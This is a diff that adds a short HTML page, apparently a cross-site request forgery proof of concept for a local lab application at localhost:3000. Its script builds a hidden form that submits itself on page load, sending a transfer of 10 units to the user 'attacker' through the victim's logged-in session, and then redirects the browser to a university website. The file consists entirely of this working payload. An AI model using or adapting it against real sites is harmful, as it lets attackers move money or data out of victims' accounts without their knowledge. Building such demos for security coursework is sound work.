@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+
+    var form = document.createElement('form');
+    form.setAttribute('method', 'POST');
+    form.setAttribute('action', 'http://localhost:3000/post_transfer'); 
+
+    var destinationUsernameField = document.createElement('input');
+    destinationUsernameField.setAttribute('type', 'hidden');
+    destinationUsernameField.setAttribute('name', 'destination_username');
+    destinationUsernameField.setAttribute('value', 'attacker');
+
+    var quantityField = document.createElement('input');
+    quantityField.setAttribute('type', 'hidden');
+    quantityField.setAttribute('name', 'quantity');
+    quantityField.setAttribute('value', '10');
+
+    form.appendChild(destinationUsernameField);
+    form.appendChild(quantityField);
+
+    document.body.appendChild(form);
+    form.submit();
+
+    window.location.href = 'https://www.kw.ac.kr';
+  </script>
+</body>
+</html>
